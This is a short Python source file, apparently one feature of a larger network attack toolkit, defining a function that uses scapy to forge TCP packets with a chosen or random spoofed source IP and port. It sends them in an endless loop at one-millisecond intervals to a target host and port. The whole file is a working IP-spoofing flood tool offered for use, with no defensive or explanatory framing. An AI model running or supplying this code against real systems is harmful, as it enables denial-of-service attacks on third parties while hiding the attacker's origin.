from scapy.all import *
import random
from colorama import Fore, Back, Style
import os
import sys

def ipspoof(source_ip, source_port, target_ip, target_port):

    # If not sudo, don't allow to continue
    if not 'SUDO_UID' in os.environ.keys():
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
        sys.exit()

    try:
        
        if source_ip.lower() == 'r':
            src_ip = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
        else:
            src_ip = f'{source_ip}'
        if source_port.lower() == 'r':
            src_port = RandShort()
        else:
            src_port = int(source_port)
        
        tgt_ip = target_ip
        tgt_port = int(target_port)

        choice = input(f'[{Fore.GREEN}+{Style.RESET_ALL}] Source IP: {Fore.GREEN}{src_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Source port: {Fore.GREEN}{src_port}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target IP: {Fore.GREEN}{tgt_ip}{Style.RESET_ALL}\n[{Fore.GREEN}+{Style.RESET_ALL}] Target port: {Fore.GREEN}{tgt_port}{Style.RESET_ALL}\nDo you wish to continue? [Y/N]: ')

        if choice.lower() == 'y':

            IP1 = IP(src=src_ip, dst=tgt_ip)
            TCP1 = TCP(sport=src_port, dport=tgt_port)
            pkt = IP1 / TCP1

            print(f'[{Fore.YELLOW}?{Style.RESET_ALL}] Sending packets to {Fore.YELLOW}{target_ip}{Style.RESET_ALL} on port {Fore.YELLOW}{target_port}{Style.RESET_ALL}...')
            
            send(pkt, loop=1, inter= .001, verbose=0)
        

        else:
            print('Operation was cancelled.')
            sys.exit('\n')
        
    except KeyboardInterrupt:
        sys.exit('\n')
    except Exception as e:
        e = sys.exc_info()[1]
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
    
    